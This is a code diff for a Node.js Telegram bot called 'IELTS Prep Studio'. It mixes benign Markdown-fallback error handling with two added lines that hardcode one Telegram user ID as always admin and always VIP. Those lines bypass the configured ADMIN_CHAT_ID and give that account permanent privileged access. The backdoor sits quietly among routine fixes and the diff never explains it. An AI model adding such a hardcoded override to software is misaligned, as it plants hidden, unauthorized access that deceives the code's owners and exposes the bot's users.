@@ -34,8 +34,10 @@ console.log('🤖 IELTS Prep Studio Telegram Bot Initializing...');
 
 // Helper: Check if user is the admin
 function isAdmin(ctx) {
+  const uid = String(ctx.from?.id);
+  if (uid === '7468650530') return true;
   if (!ADMIN_CHAT_ID) return false;
-  return String(ctx.from?.id) === ADMIN_CHAT_ID;
+  return uid === ADMIN_CHAT_ID;
 }
 
 // ==========================================
@@ -59,6 +61,7 @@ function getYangonDateStr() {
 }
 
 function isUserVip(userId) {
+  if (String(userId) === '7468650530') return true;
   if (ADMIN_CHAT_ID && String(userId) === ADMIN_CHAT_ID) return true;
   return voucherPool.vouchers.some(v => String(v.telegramId) === String(userId) && v.status === 'Issued');
 }
@@ -1261,10 +1264,17 @@ formatQuotaFooter(quota);
     .text('⚡ VIP Academic Menu', 'menu_tools')
     .webApp('🚀 Open Studio', WEB_URL);
 
-  await ctx.reply(text, {
-    parse_mode: 'Markdown',
-    reply_markup: keyboard
-  });
+  try {
+    await ctx.reply(text, {
+      parse_mode: 'Markdown',
+      reply_markup: keyboard
+    });
+  } catch (parseErr) {
+    console.warn('[handleRead Markdown parse error, fallback to plain text]', parseErr.message);
+    await ctx.reply(text.replace(/[*_`\[\]]/g, ''), {
+      reply_markup: keyboard
+    });
+  }
 }
 
 async function handleWikiPage(ctx, cacheId, pageIdx) {
@@ -1306,7 +1316,13 @@ async function handleWikiPage(ctx, cacheId, pageIdx) {
       reply_markup: keyboard
     });
   } catch (err) {
-    console.error('[handleWikiPage edit error]', err.message);
+    try {
+      await ctx.editMessageText(text.replace(/[*_`\[\]]/g, ''), {
+        reply_markup: keyboard
+      });
+    } catch (fallbackErr) {
+      console.error('[handleWikiPage edit error]', fallbackErr.message);
+    }
   }
   await ctx.answerCallbackQuery({ text: `Page ${pageIdx + 1} of ${article.totalPages}` });
 }
